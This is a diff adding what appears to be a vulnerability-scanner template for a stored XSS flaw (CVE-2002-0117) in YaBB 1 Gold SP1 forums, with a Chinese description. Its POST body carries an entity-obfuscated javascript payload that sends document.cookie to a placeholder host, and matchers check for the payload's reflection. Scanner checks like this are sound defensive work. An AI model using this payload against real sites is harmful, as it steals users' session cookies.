@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "检测 YaBB 论坛是否对 IMG 标签中的 HTML 实体编码 JavaScript 过滤不严。通过发送包含编码 JS 载荷的帖子，验证是否存在存储型 XSS 漏洞。"
+id = "POC-AVE-2002-0171"
+name = "YaBB 1 Gold SP1 跨站脚本漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2002-0117",
+    "xss",
+    "yabb",
+]
+vuln_id = [
+    "CVE-2002-0117",
+    "AVE-2002-0171",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/YaBB.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=post&board=test&subject=test&message=%5Bimg%5Djavascr%26%23x69%3Bpt%3Adocument.write%28%27%26%23x3cimg%20src%3D%26%23x68%3Btt%26%23x70%3B%3A%2F%2Fxss%2Fcookie.pl%3Fc%3D%27%2Bescape%28document.cookie%29%2B%27%26%23x3e%27%29%5B%2Fimg%5D"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "Mozilla/4.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "javascr&#x69;pt",
+    "document.write",
+]
